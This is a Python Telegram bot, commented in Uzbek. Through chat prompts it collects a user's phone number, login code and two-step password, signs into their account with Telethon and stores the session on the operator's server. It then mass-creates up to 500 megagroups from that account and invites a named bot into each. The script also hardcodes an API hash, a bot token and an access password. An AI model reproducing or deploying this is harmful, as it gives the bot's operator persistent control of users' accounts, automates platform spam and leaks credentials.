import asyncio
import logging
import os
import threading
from pathlib import Path
from flask import Flask
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ConversationHandler,
    ContextTypes,
)
from telethon import TelegramClient, errors
from telethon.tl.functions.channels import CreateChannelRequest, InviteToChannelRequest

# Logger sozlash
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# 🔑 API kalitlari
api_id = 25351311
api_hash = "7b854af9996797aa9ca67b42f1cd5cbe"
bot_token = "7352312639:AAE1NXPibdqkYIVgh0_7QYPBOWxTnCiGvSw"
ACCESS_PASSWORD = "123Q1"

# Maksimal guruh soni va kunlik limit
TOTAL_GROUPS = 500
DAILY_BATCH = 50
DAILY_RUNS = 10   # Har kuni necha marta batch ishlashi
# 24 soatni DAILY_RUNS ga bo‘linadi
BATCH_DELAY_SECONDS = (24 * 60 * 60) // DAILY_RUNS

# Holatlar
ASK_PASSWORD, PHONE, CODE, PASSWORD = range(4)

# Sessions papkasi
Path("sessions").mkdir(exist_ok=True)

# Telegram Client-lar
sessions = {}

# Avtorizatsiya qilingan foydalanuvchilar
authorized_users = set()


# Progress saqlash
def load_progress(phone: str) -> int:
    filename = f"sessions/{phone}_progress.txt"
    if os.path.exists(filename):
        with open(filename, "r") as f:
            try:
                return int(f.read())
            except:
                return 0
    return 0


def save_progress(phone: str, value: int):
    filename = f"sessions/{phone}_progress.txt"
    with open(filename, "w") as f:
        f.write(str(value))


def generate_progress_bar(current, total, length=10):
    percent = int((current / total) * 100) if total else 0
    filled = int(length * current / total) if total else 0
    bar = "▰" * filled + "▱" * (length - filled)
    return f"{bar} {percent}% ({current} / {total})"


# Start buyrug‘i
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in authorized_users:
        return await ask_phone(update)
    await update.message.reply_text("🔒 Kirish parolini kiriting:")
    return ASK_PASSWORD


async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text.strip() == ACCESS_PASSWORD:
        authorized_users.add(update.effective_user.id)
        return await ask_phone(update)
    await update.message.reply_text("❌ Noto‘g‘ri parol. Botni ishlatish uchun to‘g‘ri parol kiriting.")
    return ConversationHandler.END


async def ask_phone(update: Update):
    keyboard = ReplyKeyboardMarkup(
        [[KeyboardButton(text="📱 Telefon raqamni yuborish", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )
    await update.message.reply_text("📞 Telefon raqamingizni yuboring (+998901234567 formatda):", reply_markup=keyboard)
    return PHONE


async def phone_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    phone = None

    if update.message.contact:
        phone = update.message.contact.phone_number
    else:
        phone = update.message.text.strip()

    if not phone.startswith("+") or not phone[1:].isdigit():
        await update.message.reply_text("❌ Telefon raqam noto‘g‘ri formatda. Iltimos + bilan boshlang va faqat raqamlar kiriting.")
        return PHONE

    context.user_data["phone"] = phone

    # Telethon Client
    client = TelegramClient(f"sessions/{phone}", api_id, api_hash)
    sessions[user_id] = client
    await client.connect()

    if not await client.is_user_authorized():
        try:
            await client.send_code_request(phone)
            await update.message.reply_text("📩 Sizning telefon raqamingizga kod yuborildi. Kodni kiriting:")
            return CODE
        except Exception as e:
            await update.message.reply_text(f"❌ Kod yuborishda xato yuz berdi: {e}")
            return ConversationHandler.END
    else:
        await update.message.reply_text("✅ Akkount allaqachon avtorizatsiya qilingan. Guruhlar yaratish jarayoni boshlanadi...")
        asyncio.create_task(auto_group_task(user_id, client, phone, context))
        return ConversationHandler.END


async def code_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    client = sessions.get(user_id)
    phone = context.user_data.get("phone")

    try:
        await client.sign_in(phone, update.message.text.strip())
    except errors.SessionPasswordNeededError:
        await update.message.reply_text("🔑 2-bosqichli parolni kiriting:")
        return PASSWORD
    except Exception as e:
        await update.message.reply_text(f"❌ Kod xato yoki boshqa xatolik: {e}")
        return ConversationHandler.END

    await update.message.reply_text("✅ Akkount ulandi. Guruhlar yaratish boshlanadi...")
    asyncio.create_task(auto_group_task(user_id, client, phone, context))
    return ConversationHandler.END


async def password_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    client = sessions.get(user_id)
    try:
        await client.sign_in(password=update.message.text.strip())
    except Exception as e:
        await update.message.reply_text(f"❌ Parol noto‘g‘ri yoki xatolik yuz berdi: {e}")
        return ConversationHandler.END

    await update.message.reply_text("✅ Akkount ulandi. Guruhlar yaratish boshlanadi...")
    phone = context.user_data.get("phone")
    asyncio.create_task(auto_group_task(user_id, client, phone, context))
    return ConversationHandler.END


# 🔥 Guruh yaratish jarayoni
async def auto_group_task(user_id, client, phone, context,
                          total_groups=TOTAL_GROUPS,
                          daily_batch=DAILY_BATCH,
                          daily_runs=DAILY_RUNS):

    start_index = load_progress(phone)
    running = True
    batch_delay_seconds = ( 1 * 60) // daily_runs

    while running and start_index < total_groups:
        end_index = min(start_index + daily_batch, total_groups)

        # Status
        status_message = await context.bot.send_message(
            user_id,
            f"🚀 {phone} uchun guruhlar yaratilyapti: {start_index+1} - {end_index}\n"
            f"{generate_progress_bar(0, daily_batch)}",
            parse_mode="Markdown"
        )

        for i in range(start_index + 1, end_index + 1):
            try:
                result = await client(CreateChannelRequest(
                    title=f"Guruh #{i}",
                    about="Avtomatik yaratildi",
                    megagroup=True
                ))
                channel = result.chats[0]

                try:
                    TARGET_BOT = "@oxang_bot"
                    await client(InviteToChannelRequest(channel, [TARGET_BOT]))
                except Exception:
                    pass

                save_progress(phone, i)

                await status_message.edit_text(
                    f"🚀 {phone} uchun guruhlar yaratilyapti: {start_index+1} - {end_index}\n"
                    f"{generate_progress_bar(i - start_index, daily_batch)}",
                    parse_mode="Markdown"
                )
            except Exception as e:
                await context.bot.send_message(user_id, f"❌ Guruh #{i} yaratishda xatolik: {e}")
            await asyncio.sleep(2)

        start_index = end_index
        await context.bot.send_message(user_id, f"✅ {phone} uchun {end_index} tagacha guruh yaratildi.")

        if start_index >= total_groups:
            await context.bot.send_message(user_id, f"🎉 {phone} uchun barcha {total_groups} guruh yaratildi!")
            running = False
            break

        # Keyingi batchgacha kutadi
        await asyncio.sleep(batch_delay_seconds)

    await client.disconnect()
    sessions.pop(user_id, None)
    save_progress(phone, 0)


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await update.message.reply_text("❌ Operatsiya bekor qilindi.")
    if user_id in sessions:
        client = sessions.pop(user_id)
        await client.disconnect()
    return ConversationHandler.END


# Flask app
flask_app = Flask(__name__)

@flask_app.route("/")
def home():
    return "✅ Bot is running!", 200


def run_flask():
    flask_app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))


def main():
    application = Application.builder().token(bot_token).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_password)],
            PHONE: [MessageHandler(filters.CONTACT | filters.TEXT & ~filters.COMMAND, phone_received)],
            CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, code_received)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, password_received)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True,
    )
    application.add_handler(conv_handler)

    logger.info("Bot ishga tushmoqda...")
    application.run_polling()


if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    main()
